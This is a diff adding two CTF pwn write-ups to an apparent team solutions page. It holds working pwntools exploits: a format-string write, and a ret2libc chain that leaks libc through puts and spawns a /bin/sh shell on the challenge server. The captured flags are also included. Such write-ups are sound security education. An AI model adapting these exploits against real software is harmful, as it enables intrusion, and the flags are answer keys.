@@ -72,6 +72,93 @@ r.interactive()
 
 `flag: accessdenied{n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7}`
 
+## Write
+
+### Files
+
+[Download Files](https://github.com/nomnom-CTF/website/raw/gh-pages/accessdenied-2022/files/format_write)
+
+### Description
+
+We are given a program that takes in an input and then prints it back out to us.
+
+### Solution
+
+After expirementing a bit, I found out that the input supplied is reflected in the 6th format string argument of printf. With the help of pwntools, we get the flag with the following script:
+
+```python
+from pwn import *
+from pprint import pprint
+
+r = remote('107.178.209.165', 5337)
+elf = context.binary = ELF("./format_write")
+
+payload = fmtstr_payload(6, {elf.sym['val'] : 4919})
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+`flag: accessdenied{f0rm4t_str1n9_wr1t3s_ar3_t00_g00d_6126758a}`
+
+## ret2libc
+
+### Files
+
+[Download Files](files/ret2libc.zip)
+
+### Description
+
+We are given a program that takes in an input and then prints it back out to us (same as Write except this time its a different vulnerability)
+
+### Solution
+
+The program given to us is vulnerable to the typical ret2libc attack. Just make sure to deal with stack alignment issues by putting a `ret` gadget before calling `system()`. The following code solves the challenge and gives us the flag:
+
+```python
+from pwn import *
+from pprint import pprint
+
+r = remote('107.178.209.165', 1337)
+elf = ELF('./ret2libc')
+libc = ELF('./libc.so.6')
+
+ret = 0x40101a
+pop_rdi = 0x401243
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.sym['main']
+
+r.recvline()
+
+payload = b'a' * 40
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+r.sendline(payload)
+
+r.recvline()
+
+leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))
+
+libc.address = leak - libc.sym['puts']
+
+payload = b'a'*40
+payload += p64(pop_rdi)
+payload += p64(next(libc.search(b'/bin/sh\x00')))
+payload += p64(ret)
+payload += p64(libc.sym['system'])
+
+r.sendlineafter("name", payload)
+
+r.interactive()
+```
+
+`flag: accessdenied{ret2l1bc_15_r34lly_4m4z1ng_3xpl0_75723a21}`
+
 # Reverse Engineering
 
 ## babyrev
